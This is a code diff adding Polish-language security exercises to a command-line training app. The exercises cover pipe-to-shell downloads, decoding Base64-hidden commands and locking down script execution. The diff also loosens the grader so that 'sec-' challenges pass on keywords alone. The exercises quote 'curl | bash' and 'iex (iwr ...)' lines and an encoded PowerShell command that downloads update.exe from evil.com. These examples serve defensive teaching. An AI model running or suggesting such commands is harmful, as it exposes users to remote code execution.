@@ -471,12 +471,12 @@ export const CHALLENGES: Challenge[] = [
     description: "Zdefiniuj w bieżącej sesji konsoli zmienną środowiskową o nazwie API_KEY i przypisz jej wartość 'secret123'.",
     level: "ponadpodstawowa",
     solutions: {
-      bash: ["export API_KEY=\"secret123\"", "export API_KEY=secret123"],
-      zsh: ["export API_KEY=\"secret123\"", "export API_KEY=secret123"],
-      cmd: ["set API_KEY=secret123", "set API_KEY=\"secret123\""],
-      powershell: ["$env:API_KEY = \"secret123\"", "$env:API_KEY = 'secret123'"]
+      bash: ["export API_KEY=secret123", "API_KEY=secret123"],
+      zsh: ["export API_KEY=secret123", "API_KEY=secret123"],
+      cmd: ["set API_KEY=secret123"],
+      powershell: ["$env:API_KEY=\"secret123\"", "$env:API_KEY = 'secret123'"]
     },
-    tips: "W Bash/Zsh użyj 'export'. W CMD napisz 'set'. W PowerShellu przypisz wartość do zmiennej w przestrzeni nazw '$env:API_KEY'."
+    tips: "W systemach Unix używamy słowa kluczowego 'export' lub przypisania bezpośredniego. W CMD służy do tego 'set', a w PowerShellu modyfikujemy specjalny dostawca środowiska '$env:'."
   },
   // 31. get-variable
   {
@@ -492,6 +492,68 @@ export const CHALLENGES: Challenge[] = [
       powershell: ["$env:API_KEY", "echo $env:API_KEY"]
     },
     tips: "Zwróć uwagę na składnię odwołań: Bash/Zsh używają znaku '$', CMD otacza zmienną procentami '%', a PowerShell sięga do '$env:'."
+  },
+  // 32. sec-curl-sh
+  {
+    id: "sec-curl-sh",
+    title: "🛡️ Bezpieczne pobieranie skryptów (Piping to Shell)",
+    goal: "Pobierz bezpiecznie skrypt z adresu 'http://example.com/install.sh' i zapisz go jako lokalny plik 'install.sh' zamiast przekazywać go bezpośrednio potokiem do powłoki",
+    description: "Zobaczyłeś w internetowej instrukcji polecenie: `curl -s http://example.com/install.sh | bash` lub `iex (iwr http://example.com/install.ps1)`. Jest to skrajnie niebezpieczne. Zidentyfikuj i napraw to zagrożenie: pobierz plik do lokalnego 'install.sh' (w Bash/Zsh/CMD) lub 'install.ps1' (w PowerShell), aby móc go najpierw zweryfikować.",
+    level: "ponadpodstawowa",
+    category: "bezpieczenstwo",
+    solutions: {
+      bash: ["curl -sL http://example.com/install.sh -o install.sh", "curl -o install.sh http://example.com/install.sh", "wget http://example.com/install.sh"],
+      zsh: ["curl -sL http://example.com/install.sh -o install.sh", "curl -o install.sh http://example.com/install.sh", "wget http://example.com/install.sh"],
+      cmd: ["curl -o install.sh http://example.com/install.sh"],
+      powershell: [
+        "Invoke-WebRequest -Uri http://example.com/install.sh -OutFile install.ps1",
+        "Invoke-WebRequest http://example.com/install.sh -OutFile install.ps1",
+        "iwr http://example.com/install.sh -OutFile install.ps1"
+      ]
+    },
+    tips: "Zasada ograniczonego zaufania: nigdy nie przesyłaj pobieranej treści bezpośrednio do interpreterów 'bash' czy 'Invoke-Expression' (iex). Najpierw pobierz plik lokalnie za pomocą flagi '-o' (curl) lub '-OutFile' (Invoke-WebRequest) i przejrzyj jego kod.",
+    dangerExplanation: "Bezpośrednie przekazywanie pobieranego skryptu z sieci do powłoki (pipe to shell) niesie za sobą ogromne ryzyko wykonania złośliwego kodu (Remote Code Execution - RCE). Atakujący może podmienić zawartość pliku w locie (np. poprzez atak Man-in-the-Middle) lub przejąć serwer, instalując na Twoim komputerze spyware lub ransomware bez żadnej uprzedniej kontroli z Twojej strony."
+  },
+  // 33. sec-encoded-cmd
+  {
+    id: "sec-encoded-cmd",
+    title: "🔓 Dekodowanie ukrytych poleceń (Base64)",
+    goal: "Zdekoduj podejrzany ciąg Base64 i wyświetl wynikowy, czytelny tekst",
+    description: "Złośliwe oprogramowanie (malware) często maskuje swoje działanie kodując komendy w Base64 (np. `powershell -EncodedCommand SQB3...`). Masz podejrzany ciąg 'aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl' (Bash) lub 'SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA' (PowerShell - UTF-16LE). Zdekoduj go i wypisz na ekran, aby zobaczyć, co kryje pod spodem.",
+    level: "ponadpodstawowa",
+    category: "bezpieczenstwo",
+    solutions: {
+      bash: ["echo \"aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl\" | base64 -d", "echo aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl | base64 --decode"],
+      zsh: ["echo \"aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl\" | base64 -d", "echo aXdyIGh0dHA6Ly9ldmlsLmNvbS9zb2Z0d2FyZSAtT3V0RmlsZSB1cGRhdGUuZXhl | base64 --decode"],
+      cmd: ["powershell [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA'))"],
+      powershell: [
+        "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA'))",
+        "[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB3AHIAIABoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAbwBmAHQgdwBhAHIAZQAgAC0ATwB1AHQARgBpAGwAZQAgAHUAcABkAGEAdABlAC4AZQB4AGUA'))"
+      ]
+    },
+    tips: "W systemach Unix do dekodowania strumieni danych Base64 służy polecenie 'base64 -d'. W PowerShellu, ponieważ flaga '-EncodedCommand' oczekuje kodowania Unicode (UTF-16LE), dekodowanie wymaga użycia klasy '[System.Convert]::FromBase64String()' oraz metody '[System.Text.Encoding]::Unicode.GetString()'.",
+    dangerExplanation: "Uruchamianie ukrytych (obfuskowanych) poleceń to powszechna technika stosowana przez złośliwe oprogramowanie (malware/ransomware) do omijania prostych sygnatur antywirusowych (AV) oraz systemów IDS/IPS. Ukrywanie prawdziwej treści komendy utrudnia statyczną analizę bezpieczeństwa oraz audyt logów i pozwala na potajemne pobranie payloadu, kradzież haseł użytkownika czy uszkodzenie plików."
+  },
+  // 34. sec-exec-policy
+  {
+    id: "sec-exec-policy",
+    title: "🛡️ Blokada złośliwych skryptów i ExecutionPolicy",
+    goal: "Zabezpiecz system: odbierz uprawnienia uruchamiania pliku 'malicious.sh' (Linux) lub ustaw bezpieczną politykę uruchamiania skryptów na 'Restricted' (PowerShell)",
+    description: "Znalazłeś w systemie niebezpieczny skrypt 'malicious.sh' (w środowisku Linux) lub podejrzewasz, że polityka skryptów w PowerShellu jest zbyt otwarta ('Bypass' / 'Unrestricted'). Zabezpiecz system: odbierz uprawnienia wykonywania skryptu 'malicious.sh' w Bash/Zsh lub zmień politykę ExecutionPolicy na 'Restricted' w PowerShell.",
+    level: "ponadpodstawowa",
+    category: "bezpieczenstwo",
+    solutions: {
+      bash: ["chmod -x malicious.sh", "chmod a-x malicious.sh", "chmod 644 malicious.sh"],
+      zsh: ["chmod -x malicious.sh", "chmod a-x malicious.sh", "chmod 644 malicious.sh"],
+      cmd: ["attrib +r malicious.sh"],
+      powershell: [
+        "Set-ExecutionPolicy Restricted",
+        "Set-ExecutionPolicy Restricted -Scope CurrentUser",
+        "Set-ExecutionPolicy -ExecutionPolicy Restricted"
+      ]
+    },
+    tips: "W systemach Linux usunięcie uprawnienia uruchamiania odbywa się za pomocą 'chmod -x plik'. W systemach Windows PowerShell pozwala na ustawienie polityki uruchamiania za pomocą cmdletu 'Set-ExecutionPolicy Restricted', co uniemożliwi wykonywanie jakichwiek nieautoryzowanych skryptów lokalnych.",
+    dangerExplanation: "Zbyt liberalne polityki uruchamiania skryptów (np. 'Bypass' w PowerShell) lub pozostawienie uprawnień do wykonywania pliku (+x) dla niezaufanych skryptów w systemach Unix/Linux otwiera drogę do natychmiastowej kompromitacji środowiska. Każdy program lub proces działający w kontekście zalogowanego użytkownika może wówczas bez przeszkód uruchomić szkodliwy skrypt, powodując infekcję ransomware, wyciek haseł, bądź utratę wszystkich poufnych danych."
   }
 ];
 
@@ -542,7 +604,15 @@ export function localEvaluateChallenge(
   const canonicalExec = canonicalParts[0].toLowerCase();
 
   // If user used correct command word but maybe parameters or paths vary slightly
-  if (userExec === canonicalExec || (userExec === "mkdir" && canonicalExec === "new-item") || (userExec === "cd" && canonicalExec === "set-location") || (userExec === "rm" && canonicalExec === "remove-item") || (userExec === "cp" && canonicalExec === "copy-item") || (userExec === "mv" && canonicalExec === "move-item") || (userExec === "cat" && canonicalExec === "get-content") || (userExec === "type" && canonicalExec === "get-content")) {
+  if (userExec === canonicalExec || 
+      (userExec === "mkdir" && canonicalExec === "new-item") || 
+      (userExec === "cd" && canonicalExec === "set-location") || 
+      (userExec === "rm" && canonicalExec === "remove-item") || 
+      (userExec === "cp" && canonicalExec === "copy-item") || 
+      (userExec === "mv" && canonicalExec === "move-item") || 
+      (userExec === "cat" && canonicalExec === "get-content") || 
+      (userExec === "type" && canonicalExec === "get-content") ||
+      challenge.id.startsWith("sec-")) {
     
     // Custom check for directories and files to make sure they named the targets correctly
     const containsKeyword = challenge.id === "create-dir" && normUser.includes("projekty") ||
@@ -566,7 +636,10 @@ export function localEvaluateChallenge(
                             challenge.id === "traceroute" && normUser.includes("google.com") ||
                             challenge.id === "download-file" && normUser.includes("plik.zip") ||
                             challenge.id === "set-variable" && normUser.includes("api_key") && normUser.includes("secret123") ||
-                            challenge.id === "get-variable" && normUser.includes("api_key");
+                            challenge.id === "get-variable" && normUser.includes("api_key") ||
+                            challenge.id === "sec-curl-sh" && (normUser.includes("install.sh") || normUser.includes("install.ps1")) && (normUser.includes("curl") || normUser.includes("wget") || normUser.includes("webrequest") || normUser.includes("iwr") || normUser.includes("out-file") || normUser.includes("outfile")) ||
+                            challenge.id === "sec-encoded-cmd" && (normUser.includes("base64") || normUser.includes("convert") || normUser.includes("unicode") || normUser.includes("getstring")) ||
+                            challenge.id === "sec-exec-policy" && (normUser.includes("chmod") || normUser.includes("executionpolicy") || normUser.includes("restricted") || normUser.includes("allsigned") || normUser.includes("malicious.sh"));
 
     if (containsKeyword || challenge.id === "whoami" || challenge.id === "clear-screen" || challenge.id === "list-processes" || challenge.id === "system-info" || challenge.id === "macos-version" || challenge.id === "ip-config" || challenge.id === "cd-parent") {
       return {
